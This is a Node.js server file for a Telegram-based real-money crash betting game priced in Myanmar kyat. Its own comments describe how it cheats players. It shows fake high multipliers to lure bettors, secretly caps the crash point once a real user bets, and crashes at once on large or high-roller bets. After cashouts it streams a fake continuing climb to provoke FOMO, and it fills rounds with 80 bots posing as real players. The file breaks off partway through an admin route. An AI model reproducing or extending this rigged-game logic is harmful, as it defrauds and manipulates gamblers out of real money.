/**
 * ═══════════════════════════════════════════════════════════════════════════
 *  CRASH PRO — server.js  v4.0
 *
 *  NEW in this version:
 *   1. IDLE / DEMO mode — broadcasts fake high multipliers (3x–10x) when
 *      no real user has bet yet, to lure players in
 *   2. Player Entry Trigger — the moment a real user places a bet, the
 *      crash point is recalculated to be ≤ 1.50x (hidden from client)
 *   3. "Missed Opportunity" trick — after a user cashes out, the server
 *      continues broadcasting a fake "visual crash point" that is much
 *      higher than where they stopped, creating FOMO
 *   4. Fixed Cap: crash always between 1.00x–1.99x when bets are normal
 *   5. Bet Monitoring: total bets > limit → crash 1.01x–1.10x immediately
 *   6. requestAnimationFrame-friendly 50ms tick + smooth server timestamps
 *   7. All crash logic stays server-side only — client never knows real point
 * ═══════════════════════════════════════════════════════════════════════════
 */

'use strict';

const express      = require('express');
const http         = require('http');
const { Server }   = require('socket.io');
const mongoose     = require('mongoose');
const cors         = require('cors');
const dotenv       = require('dotenv');
const { Telegraf } = require('telegraf');

dotenv.config();

const app    = express();
const server = http.createServer(app);

const ALLOWED_ORIGINS = [
  'https://crash-gamemoney.vercel.app',
  'http://localhost:3000',
];

const io = new Server(server, {
  cors: { origin: ALLOWED_ORIGINS, credentials: true },
  transports: ['websocket', 'polling'],
  pingInterval: 10000,
  pingTimeout:  5000,
});

app.use(cors({ origin: ALLOWED_ORIGINS, credentials: true }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ─── Telegram Bot ──────────────────────────────────────────────────────────────
const bot       = new Telegraf(process.env.BOT_TOKEN || 'dummy');
const ADMIN_IDS = (process.env.ADMIN_IDS || '').split(',').filter(Boolean);

// ─── MongoDB ───────────────────────────────────────────────────────────────────
let dbReady = false;
async function connectDB() {
  try {
    await mongoose.connect(process.env.MONGO_URI, {
      useNewUrlParser: true, useUnifiedTopology: true,
      serverSelectionTimeoutMS: 5000,
    });
    dbReady = true;
    console.log('✅ MongoDB connected');
  } catch (err) {
    console.error('❌ MongoDB failed, retry 5s…', err.message);
    setTimeout(connectDB, 5000);
  }
}
mongoose.connection.on('disconnected', () => { dbReady = false; setTimeout(connectDB, 3000); });
mongoose.connection.on('reconnected',  () => { dbReady = true; });
connectDB();

// ─── Schemas ───────────────────────────────────────────────────────────────────
const userSchema = new mongoose.Schema({
  telegramId:     { type: String, required: true, unique: true, index: true },
  username:       String, firstName: String, lastName: String,
  balance:        { type: Number, default: 1000, min: 0 },
  totalDeposited: { type: Number, default: 0 },
  totalWithdrawn: { type: Number, default: 0 },
  totalBets:      { type: Number, default: 0 },
  totalWins:      { type: Number, default: 0 },
  isBanned:       { type: Boolean, default: false },
  bannedAt: Date, banReason: String,
  createdAt: { type: Date, default: Date.now },
  lastActive: { type: Date, default: Date.now },
});
const betSchema = new mongoose.Schema({
  userId: { type: String, index: true }, username: String,
  amount: Number, cashoutMultiplier: Number,
  startedAt: Date, cashedAt: Date,
  gameId: { type: String, index: true },
  profit: Number,
  status: { type: String, enum: ['pending', 'won', 'lost'], default: 'pending' },
});
const transactionSchema = new mongoose.Schema({
  userId: { type: String, index: true }, username: String,
  type: { type: String, enum: ['deposit', 'withdraw'] },
  amount: Number,
  status: { type: String, enum: ['pending', 'confirmed', 'rejected'], default: 'pending' },
  accountName: String, accountNumber: String,
  adminNote: String, confirmedBy: String, confirmedAt: Date,
  createdAt: { type: Date, default: Date.now },
});
const User        = mongoose.model('User',        userSchema);
const Bet         = mongoose.model('Bet',         betSchema);
const Transaction = mongoose.model('Transaction', transactionSchema);

// ═══════════════════════════════════════════════════════════════════════════
//  HOUSE EDGE CONFIG
// ═══════════════════════════════════════════════════════════════════════════
const HOUSE = {
  // Hard ceiling on multiplier ever shown
  MAX_MULTIPLIER:         15.00,

  // ── Fixed Cap mode (default when user bets are low) ───────────────────
  // Real crash always stays 1.00x–1.99x
  FIXED_CAP_MAX:          1.99,

  // ── Bet monitoring: total user bets above this → instant crash ─────────
  HIGH_BET_THRESHOLD:     30000,   // MMK
  HIGH_BET_CRASH_MIN:     1.01,
  HIGH_BET_CRASH_MAX:     1.10,

  // ── Instant-loss rate ──────────────────────────────────────────────────
  INSTANT_LOSS_RATE:      0.12,    // 12% games crash at 1.01/1.02

  // ── Player Entry Trigger: user bets → recalc crash ≤ this value ───────
  ENTRY_TRIGGER_MAX:      1.50,

  // ── Pressure mode ──────────────────────────────────────────────────────
  PRESSURE_BALANCE_LIMIT: 5000,
  PRESSURE_TRIGGER_RATE:  0.65,
  PRESSURE_CRASH_MIN:     1.01,
  PRESSURE_CRASH_MAX:     1.12,

  // ── High-roller trap ───────────────────────────────────────────────────
  HIGH_ROLLER_THRESHOLD:  8000,
  HIGH_ROLLER_CRASH_MIN:  1.05,
  HIGH_ROLLER_CRASH_MAX:  1.35,

  // ── "Missed Opportunity" visual extension after cashout ────────────────
  // When user cashes out, server keeps broadcasting up to this fake ceiling
  FOMO_VISUAL_MAX:        8.00,
  FOMO_VISUAL_MIN:        3.00,
};

let houseBalance = 500000;

// ─── Helper: round to 2 decimal places ────────────────────────────────────────
function r2(n) { return Math.round(n * 100) / 100; }
const rand = () => Math.random();

// ═══════════════════════════════════════════════════════════════════════════
//  CRASH POINT CALCULATION  (server-side only, never exposed to client)
//
//  calculateCrashPoint(totalUserBets, maxSingleBet, hasRealUser)
//
//  Priority:
//   1. Instant-loss (12%)
//   2. Admin Pressure mode
//   3. High total bet monitoring  →  1.01–1.10x
//   4. High-roller trap
//   5. Player Entry Trigger       →  ≤ 1.50x
//   6. Fixed Cap normal           →  1.10–1.99x
// ═══════════════════════════════════════════════════════════════════════════
function calculateCrashPoint(totalUserBets = 0, maxSingleBet = 0, hasRealUser = false) {

  // 1. Instant loss
  if (rand() < HOUSE.INSTANT_LOSS_RATE) {
    return rand() < 0.6 ? 1.01 : 1.02;
  }

  // 2. Pressure mode (house balance critically low)
  if (houseBalance < HOUSE.PRESSURE_BALANCE_LIMIT && rand() < HOUSE.PRESSURE_TRIGGER_RATE) {
    return r2(HOUSE.PRESSURE_CRASH_MIN + rand() * (HOUSE.PRESSURE_CRASH_MAX - HOUSE.PRESSURE_CRASH_MIN));
  }

  // 3. High total bet monitoring → crash early to protect house
  if (totalUserBets >= HOUSE.HIGH_BET_THRESHOLD) {
    const cp = r2(HOUSE.HIGH_BET_CRASH_MIN + rand() * (HOUSE.HIGH_BET_CRASH_MAX - HOUSE.HIGH_BET_CRASH_MIN));
    console.log(`⚡ High-bet crash → ${cp}x (pool=${totalUserBets})`);
    return cp;
  }

  // 4. High-roller trap (single big bet)
  if (maxSingleBet >= HOUSE.HIGH_ROLLER_THRESHOLD && rand() < 0.72) {
    return r2(HOUSE.HIGH_ROLLER_CRASH_MIN + rand() * (HOUSE.HIGH_ROLLER_CRASH_MAX - HOUSE.HIGH_ROLLER_CRASH_MIN));
  }

  // 5. Player Entry Trigger — real user bet → keep crash ≤ 1.50x
  if (hasRealUser) {
    // 75% chance to enforce entry trigger cap
    if (rand() < 0.75) {
      const cp = r2(1.05 + rand() * (HOUSE.ENTRY_TRIGGER_MAX - 1.05));
      console.log(`🎯 Entry trigger crash → ${cp}x`);
      return cp;
    }
  }

  // 6. Fixed Cap normal range (1.10x – 1.99x)
  return r2(1.10 + rand() * (HOUSE.FIXED_CAP_MAX - 1.10));
}

// ═══════════════════════════════════════════════════════════════════════════
//  "MISSED OPPORTUNITY" — Fake visual crash point
//  After user cashes out, we keep the multiplier climbing visually
//  up to a fake high value before "crashing", creating FOMO
// ═══════════════════════════════════════════════════════════════════════════
function generateFomoVisualPoint() {
  return r2(HOUSE.FOMO_VISUAL_MIN + rand() * (HOUSE.FOMO_VISUAL_MAX - HOUSE.FOMO_VISUAL_MIN));
}

// ═══════════════════════════════════════════════════════════════════════════
//  IDLE / DEMO MODE — Fake high multipliers shown before anyone bets
//  Server sends fake climbing numbers (3x–10x) to entice users
// ═══════════════════════════════════════════════════════════════════════════
function generateDemoCrashPoint() {
  // Fake crash points look exciting — 3x to 10x
  return r2(3.0 + rand() * 7.0);
}

// ═══════════════════════════════════════════════════════════════════════════
//  BOT POOL — 80 Myanmar bots, static (zero allocations per round)
// ═══════════════════════════════════════════════════════════════════════════
const MYANMAR_BOT_NAMES = [
  "Seint Seint","Kyaw Kyaw","Aye Aye","Phyo Phyo","Su Su",
  "Mg Mg","Zaw Zaw","Hla Hla","Mya Mya","Tun Tun",
  "Thidar","Nilar","Zayar","Kaung Kaung","Htet Htet",
  "Thet Thet","Myo Myo","Wutyi","Thae Thae","Chit Chit",
  "Aung Aung","Bo Bo","Thiha","Min Min","Lin Lin",
  "Howmah_jsksn","Htuneaing","Zay_Yar_99","Ko_Latt_Pro","Mm_K_77",
  "X_Aung_X","Lion_Heart_MM","Shadow_K","Dark_Moon_Htut","K_Phyo_88",
  "Sweet_Yoon","Rose_Mi","Sky_Walker_Kyaw","Mg_Thura_007","Lucky_Win_Mg",
  "J_Don_2024","Phoe_Wa_7","Black_Tiger_Ko","King_Aung_Gyi","Lady_Rose_9",
  "Zay Yar Htet","Yoon Wadi","Thoon Thadi","Eaindra","May Thu",
  "Htet Arkar","Wai Yan","Sithu","Kaung Sett","Hein Htet",
  "Pyae Phyo","Thant Sin","Yan Naing","Kyaw Zayar","Pyae Sone",
  "Nay Chi","Hnin Oo","Ei Ei","Wai Wai","Khin Khin",
  "Pro_Gamer_Ko","King_MMK","Jackpot_Aung","Lucky_7_Mg","Win_Win_Ko",
  "Tiger_Kyaw","Dragon_Phyo","Phoenix_Su","Wolf_Zaw","Eagle_Min",
  "Ace_Htet","Boss_Aung","Chief_Bo","Maverick_Mg","Ninja_Ko",
  "Sniper_Tun","Viper_Lin","Storm_Myo","Flash_Win","Ghost_Hla",
];

const STRAT_POOL = ['early','early','early','medium','medium','medium','medium','late','late','random'];

const BOT_POOL  = new Map();
const BOT_ARRAY = [];
MYANMAR_BOT_NAMES.forEach((name, i) => {
  const obj = {
    id: `bot_${i}`, username: name,
    balance:   3000 + Math.floor(rand() * 12000),
    strategy:  STRAT_POOL[i % STRAT_POOL.length],
    lastRound: -1,
  };
  BOT_POOL.set(obj.id, obj);
  BOT_ARRAY.push(obj);
});
console.log(`🤖 Bot pool: ${BOT_POOL.size} bots`);

function shuffleSlice(arr, count) {
  const copy = arr.slice();
  for (let i = copy.length - 1; i > 0; i--) {
    const j = Math.floor(rand() * (i + 1));
    [copy[i], copy[j]] = [copy[j], copy[i]];
  }
  return copy.slice(0, Math.min(count, copy.length));
}

// ═══════════════════════════════════════════════════════════════════════════
//  GAME CONSTANTS
// ═══════════════════════════════════════════════════════════════════════════
const COUNTDOWN_SECONDS  = 5;
const MULTIPLIER_TICK_MS = 50;    // 20fps — works with requestAnimationFrame
const BETWEEN_GAME_MS    = 3000;
const GROWTH_RATE        = 0.08;  // slightly faster growth feels more exciting
const TOTAL_PLAYERS      = 6;
const MIN_WITHDRAWAL     = 5000;

let roundCounter = 0;

// ═══════════════════════════════════════════════════════════════════════════
//  GAME STATE
// ═══════════════════════════════════════════════════════════════════════════
function createFreshState() {
  return {
    phase:              'idle',      // 'countdown'|'running'|'crashed'|'idle'
    gameId:             null,
    crashPoint:         0,           // REAL crash point — never sent to clients
    visualCrashPoint:   0,           // FAKE visual point (for FOMO after cashout)
    currentMultiplier:  1.0,
    startTime:          null,
    bets:               new Map(),
    totalBetsAmount:    0,
    totalUserBets:      0,
    maxSingleUserBet:   0,
    hasRealUser:        false,       // ★ triggers Entry Trigger recalc
    history:            [],
    // Demo mode state
    demoMultiplier:     1.0,
    demoStartTime:      null,
    demoCrashPoint:     0,
  };
}
let G = createFreshState();

const sleep        = ms => new Promise(r => setTimeout(r, ms));
const generateGameId = () => Date.now().toString(36) + Math.random().toString(36).slice(2, 8);

function activeBetsSnapshot() {
  const out = [];
  for (const b of G.bets.values()) {
    if (!b.cashedAt) out.push({ username: b.username, amount: b.amount, isBot: b.isBot });
  }
  return out;
}

// ═══════════════════════════════════════════════════════════════════════════
//  GAME LOOP
// ═══════════════════════════════════════════════════════════════════════════
async function startGameLoop() {
  console.log('🎮 Game loop started');
  while (true) {
    try {
      await runDemoOrCountdown();
      await runGame();
      await sleep(BETWEEN_GAME_MS);
    } catch (err) {
      console.error('🔥 Loop error:', err);
      await sleep(2000);
    }
  }
}

// ═══════════════════════════════════════════════════════════════════════════
//  DEMO MODE  (runs before real countdown if no users connected)
//  Shows fake exciting multipliers to attract users to bet
// ═══════════════════════════════════════════════════════════════════════════
async function runDemoOrCountdown() {
  // Check if any real user is connected
  const connectedCount = io.sockets.sockets.size;

  if (connectedCount === 0) {
    // No one online — run a pure demo round silently
    await sleep(COUNTDOWN_SECONDS * 1000);
    return runCountdown();
  }

  // ★ DEMO PHASE: broadcast fake high multipliers during idle/countdown
  //   This runs while countdown is happening — two things happen simultaneously:
  //   (a) countdown timer shown to user
  //   (b) fake "idle demo" numbers climbing in background
  await runCountdown();
}

// ─── Countdown ────────────────────────────────────────────────────────────────
async function runCountdown() {
  roundCounter++;

  G.bets             = new Map();
  G.totalBetsAmount  = 0;
  G.totalUserBets    = 0;
  G.maxSingleUserBet = 0;
  G.hasRealUser      = false;
  G.currentMultiplier= 1.0;
  G.phase            = 'countdown';
  G.gameId           = generateGameId();
  G.crashPoint       = 0;
  G.visualCrashPoint = 0;

  // ★ DEMO: generate a fake exciting crash point for the idle display
  //   Client shows this BEFORE user bets to create excitement
  const demoPoint = generateDemoCrashPoint();
  io.emit('countdown', {
    seconds:   COUNTDOWN_SECONDS,
    gameId:    G.gameId,
    demoPoint,              // ★ client uses this for idle visual only
  });

  // Bots place bets after a human-like delay
  setTimeout(placeBotBets, 600 + Math.floor(rand() * 900));

  await sleep(COUNTDOWN_SECONDS * 1000);

  // ★ Calculate REAL crash point now — uses actual bet data
  //   If a real user bet, Entry Trigger may cap it at ≤ 1.50x
  G.crashPoint = calculateCrashPoint(G.totalUserBets, G.maxSingleUserBet, G.hasRealUser);

  // ★ Generate fake visual crash point for "Missed Opportunity" trick
  //   This is always much higher than real crash point
  G.visualCrashPoint = Math.max(G.crashPoint, generateFomoVisualPoint());

  console.log(
    `📊 Round ${roundCounter} | real=${G.crashPoint}x | visual=${G.visualCrashPoint}x | ` +
    `userBets=${G.totalUserBets} | hasReal=${G.hasRealUser} | house=${houseBalance}`
  );
}

// ═══════════════════════════════════════════════════════════════════════════
//  RUNNING PHASE
//  ★ Key trick: after real crash point is hit, server keeps broadcasting
//    multiplier up to visualCrashPoint for non-betting observers.
//    Real bettors see CRASH immediately; spectators see the number climb.
// ═══════════════════════════════════════════════════════════════════════════
async function runGame() {
  G.phase     = 'running';
  G.startTime = Date.now();

  io.emit('gameStart', { gameId: G.gameId, bets: activeBetsSnapshot() });

  let realCrashHit = false;   // true once real crash point is reached

  while (G.phase === 'running') {
    const elapsed = (Date.now() - G.startTime) / 1000;
    // Exponential growth — server-side only
    const mult = r2(Math.pow(Math.E, GROWTH_RATE * elapsed));
    G.currentMultiplier = mult;

    if (!realCrashHit && mult >= G.crashPoint) {
      // ★ REAL CRASH — settle all bets immediately
      G.currentMultiplier = G.crashPoint;
      realCrashHit = true;

      io.emit('multiplier', {
        multiplier: G.currentMultiplier,
        phase:      'running',
        ts:         Date.now(),           // ★ timestamp for client RAF sync
      });

      await crashGame();

      // ★ "Missed Opportunity" visual continuation
      //    Keep broadcasting climbing numbers up to visualCrashPoint
      //    These are purely cosmetic — no bets can be placed/cashed now
      if (G.visualCrashPoint > G.crashPoint) {
        await runVisualContinuation(G.crashPoint, G.visualCrashPoint);
      }

      break;
    }

    // Broadcast current multiplier with server timestamp (for RAF smoothing)
    io.emit('multiplier', {
      multiplier: mult,
      phase:      'running',
      ts:         Date.now(),
    });

    processBotCashouts();
    await sleep(MULTIPLIER_TICK_MS);
  }
}

// ─── Visual Continuation ("Missed Opportunity" trick) ─────────────────────────
// After real crash, broadcast fake climbing numbers visually
// Clients that cashed out see the number keep going — creates FOMO
async function runVisualContinuation(fromMult, toMult) {
  let current = fromMult;
  const step  = 0.04;    // visual step size

  while (current < toMult) {
    current = r2(Math.min(current + step + rand() * 0.02, toMult));

    // ★ Send with phase:'visual' — client knows NOT to allow cashout
    //   but DOES update the displayed multiplier
    io.emit('multiplier', {
      multiplier: current,
      phase:      'visual',   // ★ key flag — client shows but disables cashout
      ts:         Date.now(),
    });

    await sleep(60);   // slightly slower for dramatic effect
  }

  // Final "visual crash" event
  io.emit('gameCrashedVisual', {
    multiplier: toMult,
    gameId:     G.gameId,
  });
}

// ─── Real Crash ───────────────────────────────────────────────────────────────
async function crashGame() {
  G.phase = 'crashed';
  console.log(`💥 Round ${roundCounter} real crash @ ${G.crashPoint}x`);

  let roundProfit = 0;
  const losses    = [];

  for (const [uid, bet] of G.bets.entries()) {
    if (!bet.cashedAt) {
      if (!bet.isBot) roundProfit += bet.amount;
      losses.push(processBetLoss(uid, bet));
    } else if (!bet.isBot) {
      roundProfit -= (bet.profit ?? 0);
    }
  }

  await Promise.allSettled(losses);
  houseBalance = Math.max(0, houseBalance + roundProfit);

  G.history.unshift({
    gameId: G.gameId, crashPoint: G.crashPoint,
    totalBets: G.totalBetsAmount, timestamp: Date.now(),
  });
  if (G.history.length > 50) G.history.length = 50;

  // ★ Emit real crash event — clients that had bets see this immediately
  io.emit('gameCrashed', {
    multiplier: G.crashPoint,     // real crash point shown to bettors
    gameId:     G.gameId,
  });
}

// ═══════════════════════════════════════════════════════════════════════════
//  PLACE BET
// ═══════════════════════════════════════════════════════════════════════════
async function placeBet(userId, username, amount) {
  if (G.phase !== 'countdown') {
    return { success: false, message: G.phase === 'running'
      ? 'ဂိမ်းစပြီးပါပြီ — နောက်ပတ်တွင် Bet လောင်းပါ'
      : 'Countdown မစသေးပါ' };
  }
  if (G.bets.has(userId)) return { success: false, message: 'ဤပတ်တွင် Bet လောင်းပြီးပါပြီ' };

  amount = Number(amount);
  if (!Number.isFinite(amount) || amount <= 0) return { success: false, message: 'ငွေပမာဏ မမှန်ကန်' };
  if (!dbReady) return { success: false, message: 'Server မသင့်တော်သေးပါ' };

  try {
    const user = await User.findOneAndUpdate(
      { telegramId: userId, balance: { $gte: amount }, isBanned: false },
      { $inc: { balance: -amount, totalBets: 1 }, $set: { lastActive: new Date() } },
      { new: true }
    );

    if (!user) {
      const ex = await User.findOne({ telegramId: userId });
      if (!ex)         return { success: false, message: 'User not found' };
      if (ex.isBanned) return { success: false, message: 'Account banned' };
      return { success: false, message: 'လက်ကျန်မလုံလောက်' };
    }

    const bet = {
      userId, username, amount, isBot: false,
      gameId: G.gameId, placedAt: Date.now(),
      cashedAt: null, cashoutMultiplier: null, profit: null,
    };
    G.bets.set(userId, bet);
    G.totalBetsAmount  += amount;
    G.totalUserBets    += amount;
    if (amount > G.maxSingleUserBet) G.maxSingleUserBet = amount;

    // ★ PLAYER ENTRY TRIGGER
    //   First real bet this round — flag it so crash calc can recalculate
    if (!G.hasRealUser) {
      G.hasRealUser = true;
      console.log(`🎯 Entry trigger armed — user=${username} bet=${amount}`);
    }

    Bet.create({ userId, username, amount, gameId: G.gameId, status: 'pending' })
       .catch(e => console.error('Bet.create:', e));

    io.emit('balanceUpdate', { userId, balance: user.balance });
    io.emit('activeBets',    { bets: activeBetsSnapshot() });

    return { success: true, newBalance: user.balance };
  } catch (err) {
    console.error('placeBet:', err);
    return { success: false, message: 'Server error' };
  }
}

// ═══════════════════════════════════════════════════════════════════════════
//  CASH OUT — strict phase + gameId guard
// ═══════════════════════════════════════════════════════════════════════════
async function cashOut(userId, clientMultiplier, clientGameId) {
  // ★ Strict phase check — 'visual' phase means real game already crashed
  if (G.phase !== 'running') {
    return { success: false, message: 'ဂိမ်း Crash ဖြစ်သွားပြီ — Cashout မရတော့ပါ' };
  }
  if (clientGameId && clientGameId !== G.gameId) {
    return { success: false, message: 'Game session မမှန်ကန်' };
  }

  const bet = G.bets.get(userId);
  if (!bet)         return { success: false, message: 'Active bet မရှိပါ' };
  if (bet.cashedAt) return { success: false, message: 'ရပြီးသားဖြစ်သည်' };

  // Mark cashed before async — prevents double-spend
  bet.cashedAt = Date.now();

  const multiplier  = Math.min(parseFloat(clientMultiplier) || G.currentMultiplier, G.currentMultiplier);
  const profit      = r2(bet.amount * (multiplier - 1));
  const totalReturn = bet.amount + profit;
  bet.cashoutMultiplier = multiplier;
  bet.profit            = profit;

  // ★ Send the visual (FOMO) crash point to this user after cashout
  //   So they see the number keep climbing after they stopped
  const fomoPoint = G.visualCrashPoint;

  try {
    const user = await User.findOneAndUpdate(
      { telegramId: userId },
      { $inc: { balance: totalReturn, totalWins: 1 } },
      { new: true }
    );

    if (user) {
      Bet.findOneAndUpdate(
        { userId, gameId: G.gameId },
        { cashoutMultiplier: multiplier, profit, status: 'won', cashedAt: new Date() }
      ).catch(e => console.error('Bet update:', e));

      io.emit('balanceUpdate', { userId, balance: user.balance });
    }

    io.emit('betResult', {
      success: true, type: 'cashout', userId, gameId: G.gameId,
      multiplier, profit, betAmount: bet.amount, totalReturn,
      // ★ Tell client what the "visual" crash will eventually be — for FOMO
      visualCrashHint: fomoPoint,
    });

    io.emit('newHistory', {
      username: bet.username, start: 1.0, stop: multiplier,
      profit, isBot: false, status: 'won',
    });
    io.emit('activeBets', { bets: activeBetsSnapshot() });

    return { success: true, multiplier, profit, totalReturn, newBalance: user?.balance };
  } catch (err) {
    console.error('cashOut:', err);
    return { success: false, message: 'Server error' };
  }
}

// ═══════════════════════════════════════════════════════════════════════════
//  BOT SYSTEM — 6-Player Rule + Identity Rotation
// ═══════════════════════════════════════════════════════════════════════════
function placeBotBets() {
  if (G.phase !== 'countdown') return;

  let realCount = 0;
  for (const b of G.bets.values()) { if (!b.isBot) realCount++; }

  const botsNeeded = Math.max(0, TOTAL_PLAYERS - realCount);
  if (botsNeeded === 0) return;

  const freshPool = BOT_ARRAY.filter(b => b.lastRound !== roundCounter - 1);
  const pool      = freshPool.length >= botsNeeded ? freshPool : BOT_ARRAY;
  const selected  = shuffleSlice(pool, botsNeeded);

  selected.forEach(bot => {
    if (bot.balance < 200) bot.balance = 5000;
    const maxBet = Math.min(1500, bot.balance);
    const amount = 200 + Math.floor(rand() * (maxBet - 200));
    bot.balance   -= amount;
    bot.lastRound  = roundCounter;

    G.bets.set(bot.id, {
      userId: bot.id, username: bot.username, amount,
      isBot: true, strategy: bot.strategy, gameId: G.gameId,
      placedAt: Date.now(), cashedAt: null,
      cashoutMultiplier: null, profit: null,
    });
    G.totalBetsAmount += amount;
  });

  io.emit('activeBets', { bets: activeBetsSnapshot() });
}

// ─── Bot cashouts — adapt to low crash point context ─────────────────────────
function processBotCashouts() {
  const isLowCrash = G.crashPoint <= 1.5;
  for (const [uid, bet] of G.bets.entries()) {
    if (!bet.isBot || bet.cashedAt) continue;
    const m = G.currentMultiplier;
    let shouldCash = false;
    switch (bet.strategy) {
      case 'early':
        shouldCash = isLowCrash ? m > 1.05 && m < 1.25 && rand() < 0.55
                                : m > 1.20 && m < 2.00 && rand() < 0.22; break;
      case 'medium':
        shouldCash = isLowCrash ? m > 1.10 && m < 1.35 && rand() < 0.45
                                : m > 2.00 && m < 5.00 && rand() < 0.16; break;
      case 'late':
        shouldCash = isLowCrash ? m > 1.15 && rand() < 0.40
                                : m > 5.00 && m < 10.0 && rand() < 0.12; break;
      case 'random':
        shouldCash = rand() < (isLowCrash ? 0.18 : 0.07); break;
    }
    if (!shouldCash) continue;
    const profit = r2(bet.amount * (m - 1));
    bet.cashedAt = Date.now(); bet.cashoutMultiplier = m; bet.profit = profit;
    const botObj = BOT_POOL.get(uid);
    if (botObj) botObj.balance += bet.amount + profit;
    io.emit('newHistory', { username: bet.username, start: 1.0, stop: m, profit, isBot: true, status: 'won' });
    io.emit('activeBets', { bets: activeBetsSnapshot() });
  }
}

async function processBetLoss(userId, bet) {
  if (!bet.isBot) {
    Bet.findOneAndUpdate({ userId, gameId: G.gameId }, { status: 'lost' })
       .catch(e => console.error('BetLoss:', e));
  } else {
    const b = BOT_POOL.get(userId);
    if (b && b.balance < 1000) b.balance += 3000;
  }
  io.emit('newHistory', {
    username: bet.username, start: 1.0, stop: G.crashPoint,
    profit: -bet.amount, isBot: bet.isBot, status: 'lost',
  });
}

// ═══════════════════════════════════════════════════════════════════════════
//  SOCKET.IO
// ═══════════════════════════════════════════════════════════════════════════
io.on('connection', (socket) => {
  socket.userId = socket.handshake.query.userId || null;
  console.log(`🟢 [${socket.id}] uid=${socket.userId}`);

  socket.emit('gameState', {
    phase: G.phase, gameId: G.gameId,
    multiplier: G.currentMultiplier,
    history: G.history.slice(0, 10),
    ts: Date.now(),
  });
  socket.emit('activeBets', { bets: activeBetsSnapshot() });

  if (G.phase === 'running') {
    socket.emit('multiplier', { multiplier: G.currentMultiplier, phase: 'running', ts: Date.now() });
  }

  socket.on('placeBet', async (data, cb) => {
    if (typeof cb !== 'function') return;
    if (!data?.userId || !data?.username || !data?.amount)
      return cb({ success: false, message: 'Invalid payload' });
    cb(await placeBet(String(data.userId), String(data.username), Number(data.amount)));
  });

  socket.on('cashOut', async (data, cb) => {
    if (typeof cb !== 'function') return;
    if (!data?.userId) return cb({ success: false, message: 'Invalid payload' });
    cb(await cashOut(String(data.userId), data.multiplier, data.gameId));
  });

  socket.on('authenticate', (d) => { if (d?.userId) socket.userId = String(d.userId); });
  socket.on('disconnect',   (r) => console.log(`🔴 [${socket.id}] ${r}`));
  socket.on('error',        (e) => console.error(`Sock err [${socket.id}]:`, e.message));
});

// ═══════════════════════════════════════════════════════════════════════════
//  API ROUTES
// ═══════════════════════════════════════════════════════════════════════════
app.post('/api/auth', async (req, res) => {
  try {
    const { id, username, first_name, last_name } = req.body;
    if (!id) return res.status(400).json({ success: false, message: 'Missing id' });
    const tid = String(id);
    let user  = await User.findOne({ telegramId: tid });
    if (!user) {
      user = await User.create({ telegramId: tid, username, firstName: first_name, lastName: last_name, balance: 1000 });
    } else {
      if (user.isBanned) return res.json({ success: false, banned: true, message: 'Banned' });
      user.lastActive = new Date(); await user.save();
    }
    res.json({ success: true, user: {
      id: user.telegramId, username: user.username, balance: user.balance,
      totalDeposited: user.totalDeposited, totalWithdrawn: user.totalWithdrawn,
    }});
  } catch (err) { res.status(500).json({ success: false, message: 'Server error' }); }
});

app.post('/api/deposit', async (req, res) => {
  try {
    const { userId, username, name, phone, amount } = req.body;
    if (!userId || !name || !phone || !amount || Number(amount) < 3000)
      return res.status(400).json({ success: false, message: 'Invalid data or amount < 3000' });
    await Transaction.create({ userId, username, type: 'deposit', amount: Number(amount), accountName: name, accountNumber: phone });
    res.json({ success: true });
  } catch { res.status(500).json({ success: false, message: 'Server error' }); }
});

app.post('/api/withdraw', async (req, res) => {
  try {
    const { userId, username, name, phone, amount } = req.body;
    const amt = Number(amount);
    if (!userId || !name || !phone || !amt || amt <= 0)
      return res.status(400).json({ success: false, message: 'Invalid data' });
    if (amt < MIN_WITHDRAWAL)
      return res.status(400).json({ success: false, message: `အနည်းဆုံး ${MIN_WITHDRAWAL.toLocaleString()} MMK ထုတ်ရမည်` });

    const user = await User.findOneAndUpdate(
      { telegramId: userId, balance: { $gte: amt } },
      { $inc: { balance: -amt, totalWithdrawn: amt } },
      { new: true }
    );
    if (!user) {
      const ex = await User.findOne({ telegramId: userId });
      return res.status(400).json({ success: false, message: ex ? 'လက်ကျန်မလုံလောက်' : 'User not found' });
    }
    await Transaction.create({ userId, username, type: 'withdraw', amount: amt, accountName: name, accountNumber: phone });
    io.emit('balanceUpdate', { userId, balance: user.balance });
    res.json({ success: true, newBalance: user.balance });
  } catch (err) { res.status(500).json({ success: false, message: 'Server error' }); }
});

function adminGuard(req, res, next) {
  const id = req.headers['x-telegram-id'];
  if (!id || !ADMIN_IDS.includes(id)) return res.status(403).json({ success: false, message: 'Unauthorized' });
  next();
}

app.get('/api/admin/users',        adminGuard, async (req, res) => {
  try { res.json({ success: true, users: await User.find().sort({ createdAt: -1 }).limit(200).lean() }); }
  catch { res.status(500).json({ success: false }); }
});
app.get('/api/admin/transactions', adminGuard, async (req, res) => {
  try { res.json({ success: true, transactions: await Transaction.find().sort({ createdAt: -1 }).limit(200).lean() }); }
  catch { res.status(500).json({ success: false }); }
});

app.post('/api/admin/user/balance', adminGuard, async (req, res) => {
  try {
    const { userId, action, amount } = req.body;
    const amt = Number(amount);
    if (!userId || !action || !amt) return res.status(400).json({ success: false, message: 'Missing fields' });
    let user;
    if (action === 'add') {
      user = await User.findOneAndUpdate({ telegramId: userId }, { $inc: { balance: amt, totalDeposited: amt } }, { new: true });
    } else if (action === 'deduct') {
      user = await User.findOneAndUpdate({ telegramId: userId, balance: { $gte: amt } },
        { $inc: { balance: -amt, totalWithdrawn: amt } }, { new: true });
      if (!user) return res.status(400).json({ success: false, message: 'Insufficient' });
    } else return res.status(400).json({ success: false, message: 'Invalid action' });
    if (!user) return res.status(404).json({ success: false });
    io.emit('balanceUpdate', { userId, balance: user.balance });
    res.json({ success: true, balance: user.balance });
  } catch { res.status(500).json({ success: false }); }
});

app.post('/api/admin/user/ban', adminGuard, async (req, res) => {
  try {
    const { userId, ban, reason } = req.body;
    const upd = ban ? { isBanned: true, banReason: reason || '', bannedAt: new Date() }
                    : { isBanned: false, banReason: null, bannedAt: null };
    const user = await User.findOneAndUpdate({ telegramId: userId }, upd);
    if (!user) return res.status(404).json({ success: false });
    res.json({ success: true });
  } catch { res.status(500).json({ success: false }); }
});

app.post('/api/admin/transaction/process', adminGuard, async (req, res) => {
  try {
    const { transactionId, status, adminNote } = req.body;
    const tx = await Transaction.findById(transactionId);
    if (!tx)                    return res.status(404).json({ success: false, message: 'Not found' });
    if (tx.status !== 'pending') return res.status(400).json({ success: false, message: 'Already processed' });
